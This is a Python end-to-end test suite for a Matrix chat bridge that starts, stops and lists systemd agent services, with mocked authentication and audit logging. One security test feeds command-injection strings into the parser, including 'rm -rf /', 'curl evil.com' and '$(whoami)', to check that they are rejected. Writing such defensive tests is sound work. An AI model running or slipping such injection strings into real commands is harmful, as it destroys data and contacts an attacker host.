"""
End-to-End Integration Tests for RAVE Matrix Bridge
Comprehensive testing of the complete Matrix command flow.
"""

import pytest
import asyncio
import json
import time
from unittest.mock import AsyncMock, MagicMock, patch
from aiohttp import web
from aiohttp.test_utils import AioHTTPTestCase

import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'src'))

from main import MatrixAppserviceBridge
from command_parser import SecureCommandParser
from agent_controller import SystemdAgentController
from auth import GitLabOIDCValidator
from audit import SecurityAuditLogger


class TestMatrixBridgeEndToEnd(AioHTTPTestCase):
    """End-to-end integration tests for the Matrix bridge."""
    
    async def get_application(self):
        """Create test application with mocked dependencies."""
        
        # Create a test configuration with all required defaults
        self.test_config = {
            'host': '127.0.0.1',
            'port': 9000,
            'homeserver_url': 'https://matrix.example.com',
            'as_token': 'test-as-token',
            'hs_token': 'test-hs-token',
            'gitlab_url': 'https://gitlab.example.com',
            'oidc_client_id': 'test-client',
            'oidc_client_secret': 'test-secret',
            'allowed_commands': ['start-agent', 'stop-agent', 'status-agent', 'list-agents'],
            'allowed_agent_services': ['backend-architect', 'test-writer-fixer'],
            'agent_service_prefix': 'rave-agent-',
            'rate_limit_rpm': 60,
            'rate_limit_burst': 5,
            'audit_log_file': '/tmp/test-audit.log',
            'max_request_size': 1024 * 1024,  # 1MB
            'request_timeout': 30,
            'enable_metrics': True,
            'metrics_port': 9001,
            'log_level': 'INFO',
            'command_timeout': 10
        }
        
        # Mock the configuration file loading
        with patch.object(MatrixAppserviceBridge, '_load_config', return_value=self.test_config):
            self.bridge = MatrixAppserviceBridge('test-config.yaml')
            
        # Mock external dependencies
        self._setup_mocks()
        
        return self.bridge.create_app()
    
    def _setup_mocks(self):
        """Set up mocks for external dependencies."""
        
        # Mock OIDC validator
        self.oidc_mock = AsyncMock(spec=GitLabOIDCValidator)
        self.oidc_mock.validate_user.return_value = {
            'user_id': '@testuser:example.com',
            'username': 'testuser',
            'groups': ['developers', 'admins']
        }
        self.bridge.oidc_validator = self.oidc_mock
        
        # Mock agent controller with systemd operations
        self.agent_mock = AsyncMock(spec=SystemdAgentController)
        self._setup_agent_mock_responses()
        self.bridge.agent_controller = self.agent_mock
        
        # Mock audit logger
        self.audit_mock = AsyncMock(spec=SecurityAuditLogger)
        self.bridge.audit_logger = self.audit_mock
        
        # Mock Matrix message sending
        self.bridge._send_matrix_message = AsyncMock()
    
    def _setup_agent_mock_responses(self):
        """Set up realistic agent controller mock responses."""
        
        # Mock successful agent start
        self.agent_mock.start_agent.return_value = {
            'success': True,
            'message': 'Agent backend-architect started successfully',
            'details': {
                'agent_type': 'backend-architect',
                'service_name': 'rave-agent-backend-architect.service',
                'state': 'active',
                'sub_state': 'running',
                'pid': 12345
            },
            'timestamp': time.time(),
            'duration': 2.5
        }
        
        # Mock agent status check
        self.agent_mock.get_status.return_value = {
            'success': True,
            'message': 'Status retrieved for agent backend-architect',
            'details': {
                'agent_type': 'backend-architect',
                'service_name': 'rave-agent-backend-architect.service',
                'state': 'active',
                'sub_state': 'running',
                'active_since': '2024-08-24T01:00:00Z',
                'pid': 12345,
                'memory_usage': 134217728,  # 128MB
                'cpu_percent': 5.2,
                'recent_logs': [
                    '2024-08-24T01:00:00 INFO Agent started successfully',
                    '2024-08-24T01:01:00 INFO Processing task queue',
                    '2024-08-24T01:02:00 INFO Task completed'
                ]
            },
            'timestamp': time.time(),
            'duration': 0.5
        }
        
        # Mock agent list
        self.agent_mock.list_agents.return_value = {
            'success': True,
            'message': 'Found 2 agents',
            'details': {
                'agents': [
                    {
                        'agent_type': 'backend-architect',
                        'service_name': 'rave-agent-backend-architect.service',
                        'state': 'active',
                        'sub_state': 'running',
                        'pid': 12345,
                        'memory_usage': 134217728,
                        'cpu_percent': 5.2
                    },
                    {
                        'agent_type': 'test-writer-fixer',
                        'service_name': 'rave-agent-test-writer-fixer.service',
                        'state': 'inactive',
                        'sub_state': 'dead',
                        'pid': None,
                        'memory_usage': None,
                        'cpu_percent': None
                    }
                ],
                'summary': {
                    'total': 2,
                    'active': 1,
                    'inactive': 1,
                    'failed': 0,
                    'other': 0
                },
                'total_allowed': 2
            },
            'timestamp': time.time(),
            'duration': 1.2
        }
    
    async def test_health_endpoint(self):
        """Test the health check endpoint."""
        resp = await self.client.request('GET', '/health')
        self.assertEqual(resp.status, 200)
        
        data = await resp.json()
        self.assertEqual(data['status'], 'healthy')
        self.assertIn('components', data)
        self.assertIn('timestamp', data)
        self.assertIn('version', data)
    
    async def test_metrics_endpoint(self):
        """Test the Prometheus metrics endpoint."""
        resp = await self.client.request('GET', '/metrics')
        self.assertEqual(resp.status, 200)
        
        # Check that it returns Prometheus format
        text = await resp.text()
        self.assertIn('# HELP', text)
        self.assertIn('matrix_bridge_requests_total', text)
    
    async def test_invalid_appservice_token(self):
        """Test rejection of invalid appservice tokens."""
        transaction_data = {
            'events': [{
                'type': 'm.room.message',
                'content': {'msgtype': 'm.text', 'body': '!start-agent backend-architect'},
                'sender': '@testuser:example.com',
                'room_id': '!test:example.com',
                'event_id': '$test:example.com'
            }]
        }
        
        # Send with wrong token
        resp = await self.client.request(
            'PUT', 
            '/_matrix/app/v1/transactions/test123',
            json=transaction_data,
            headers={'Authorization': 'Bearer wrong-token'}
        )
        
        self.assertEqual(resp.status, 401)
    
    async def test_successful_agent_start_command(self):
        """Test successful agent start command through Matrix."""
        transaction_data = {
            'events': [{
                'type': 'm.room.message',
                'content': {'msgtype': 'm.text', 'body': '!start-agent backend-architect'},
                'sender': '@testuser:example.com',
                'room_id': '!test:example.com',
                'event_id': '$test:example.com'
            }]
        }
        
        resp = await self.client.request(
            'PUT',
            '/_matrix/app/v1/transactions/test123',
            json=transaction_data,
            headers={'Authorization': 'Bearer test-as-token'}
        )
        
        self.assertEqual(resp.status, 200)
        
        # Verify OIDC validation was called
        self.oidc_mock.validate_user.assert_called_once_with('@testuser:example.com')
        
        # Verify agent start was called
        self.agent_mock.start_agent.assert_called_once_with('backend-architect')
        
        # Verify Matrix message was sent
        self.bridge._send_matrix_message.assert_called_once()
        call_args = self.bridge._send_matrix_message.call_args
        self.assertEqual(call_args[0][0], '!test:example.com')  # room_id
        self.assertIn('✅', call_args[0][1])  # success message
        self.assertIn('started successfully', call_args[0][1])
        
        # Verify audit logging
        self.audit_mock.log.assert_called()
        
    async def test_agent_status_command(self):
        """Test agent status command."""
        transaction_data = {
            'events': [{
                'type': 'm.room.message',
                'content': {'msgtype': 'm.text', 'body': '!status-agent backend-architect'},
                'sender': '@testuser:example.com',
                'room_id': '!test:example.com',
                'event_id': '$test:example.com'
            }]
        }
        
        resp = await self.client.request(
            'PUT',
            '/_matrix/app/v1/transactions/test456',
            json=transaction_data,
            headers={'Authorization': 'Bearer test-as-token'}
        )
        
        self.assertEqual(resp.status, 200)
        
        # Verify agent status was called
        self.agent_mock.get_status.assert_called_once_with('backend-architect')
        
        # Verify response includes status details
        call_args = self.bridge._send_matrix_message.call_args
        message = call_args[0][1]
        self.assertIn('✅', message)
        self.assertIn('Details:', message)
        self.assertIn('active', message)
        self.assertIn('128MB', message)  # Memory usage formatted
    
    async def test_list_agents_command(self):
        """Test list agents command."""
        transaction_data = {
            'events': [{
                'type': 'm.room.message',
                'content': {'msgtype': 'm.text', 'body': '!list-agents'},
                'sender': '@testuser:example.com',
                'room_id': '!test:example.com',
                'event_id': '$test:example.com'
            }]
        }
        
        resp = await self.client.request(
            'PUT',
            '/_matrix/app/v1/transactions/test789',
            json=transaction_data,
            headers={'Authorization': 'Bearer test-as-token'}
        )
        
        self.assertEqual(resp.status, 200)
        
        # Verify list agents was called
        self.agent_mock.list_agents.assert_called_once()
        
        # Verify response includes agent summary
        call_args = self.bridge._send_matrix_message.call_args
        message = call_args[0][1]
        self.assertIn('Found 2 agents', message)
        self.assertIn('active: 1', message)
        self.assertIn('inactive: 1', message)
    
    async def test_authentication_failure(self):
        """Test handling of authentication failure."""
        # Mock OIDC validation failure
        self.oidc_mock.validate_user.side_effect = Exception("Invalid token")
        
        transaction_data = {
            'events': [{
                'type': 'm.room.message',
                'content': {'msgtype': 'm.text', 'body': '!start-agent backend-architect'},
                'sender': '@baduser:example.com',
                'room_id': '!test:example.com',
                'event_id': '$test:example.com'
            }]
        }
        
        resp = await self.client.request(
            'PUT',
            '/_matrix/app/v1/transactions/test999',
            json=transaction_data,
            headers={'Authorization': 'Bearer test-as-token'}
        )
        
        self.assertEqual(resp.status, 200)  # Transaction succeeds, but command fails
        
        # Verify error response sent to Matrix room
        call_args = self.bridge._send_matrix_message.call_args
        message = call_args[0][1]
        self.assertIn('⚠️', message)
        self.assertIn('Authentication failed', message)
        
        # Verify agent was NOT called
        self.agent_mock.start_agent.assert_not_called()
    
    async def test_invalid_command_security(self):
        """Test security validation of malicious commands."""
        malicious_commands = [
            '!invalid-command',
            '!start-agent; rm -rf /',
            '!start-agent backend-architect && curl evil.com',
            '!start-agent $(whoami)',
            '!start-agent `id`'
        ]
        
        for i, cmd in enumerate(malicious_commands):
            transaction_data = {
                'events': [{
                    'type': 'm.room.message',
                    'content': {'msgtype': 'm.text', 'body': cmd},
                    'sender': '@testuser:example.com',
                    'room_id': '!test:example.com',
                    'event_id': f'$test{i}:example.com'
                }]
            }
            
            resp = await self.client.request(
                'PUT',
                f'/_matrix/app/v1/transactions/security{i}',
                json=transaction_data,
                headers={'Authorization': 'Bearer test-as-token'}
            )
            
            self.assertEqual(resp.status, 200)
            
            # All malicious commands should result in error messages
            call_args = self.bridge._send_matrix_message.call_args
            message = call_args[0][1]
            self.assertIn('⚠️', message)
            self.assertIn('Invalid command', message)
    
    async def test_rate_limiting(self):
        """Test that rate limiting works correctly."""
        # Note: This is a simplified test - full rate limiting would require
        # more sophisticated mocking of the rate limiter
        
        # Rapid successive requests should eventually be rate limited
        transaction_data = {
            'events': [{
                'type': 'm.room.message',
                'content': {'msgtype': 'm.text', 'body': '!list-agents'},
                'sender': '@testuser:example.com',
                'room_id': '!test:example.com',
                'event_id': '$test:example.com'
            }]
        }
        
        # First request should succeed
        resp = await self.client.request(
            'PUT',
            '/_matrix/app/v1/transactions/rate1',
            json=transaction_data,
            headers={'Authorization': 'Bearer test-as-token'}
        )
        self.assertEqual(resp.status, 200)
    
    async def test_non_command_messages_ignored(self):
        """Test that non-command messages are ignored."""
        transaction_data = {
            'events': [{
                'type': 'm.room.message',
                'content': {'msgtype': 'm.text', 'body': 'Hello world, not a command'},
                'sender': '@testuser:example.com',
                'room_id': '!test:example.com',
                'event_id': '$test:example.com'
            }]
        }
        
        resp = await self.client.request(
            'PUT',
            '/_matrix/app/v1/transactions/ignore',
            json=transaction_data,
            headers={'Authorization': 'Bearer test-as-token'}
        )
        
        self.assertEqual(resp.status, 200)
        
        # Should not have called any agent operations
        self.agent_mock.start_agent.assert_not_called()
        self.agent_mock.get_status.assert_not_called()
        self.agent_mock.list_agents.assert_not_called()
        
        # Should not have sent any Matrix messages
        self.bridge._send_matrix_message.assert_not_called()
    
    async def test_user_and_room_queries(self):
        """Test Matrix user and room query endpoints."""
        # Test user query (should return 404)
        resp = await self.client.request(
            'GET',
            '/_matrix/app/v1/users/@testuser:example.com',
            headers={'Authorization': 'Bearer test-as-token'}
        )
        self.assertEqual(resp.status, 404)
        
        # Test room query (should return 404)  
        resp = await self.client.request(
            'GET',
            '/_matrix/app/v1/rooms/#testroom:example.com',
            headers={'Authorization': 'Bearer test-as-token'}
        )
        self.assertEqual(resp.status, 404)
    
    async def test_circuit_breaker_simulation(self):
        """Test circuit breaker behavior with system failures."""
        # Simulate systemd failure
        self.agent_mock.start_agent.side_effect = Exception("systemd unavailable")
        
        transaction_data = {
            'events': [{
                'type': 'm.room.message',
                'content': {'msgtype': 'm.text', 'body': '!start-agent backend-architect'},
                'sender': '@testuser:example.com',
                'room_id': '!test:example.com',
                'event_id': '$test:example.com'
            }]
        }
        
        resp = await self.client.request(
            'PUT',
            '/_matrix/app/v1/transactions/circuit',
            json=transaction_data,
            headers={'Authorization': 'Bearer test-as-token'}
        )
        
        self.assertEqual(resp.status, 200)
        
        # Should send error message to Matrix room
        call_args = self.bridge._send_matrix_message.call_args
        message = call_args[0][1]
        self.assertIn('⚠️', message)
        # Note: Circuit breaker message depends on implementation


if __name__ == '__main__':
    pytest.main([__file__, '-v'])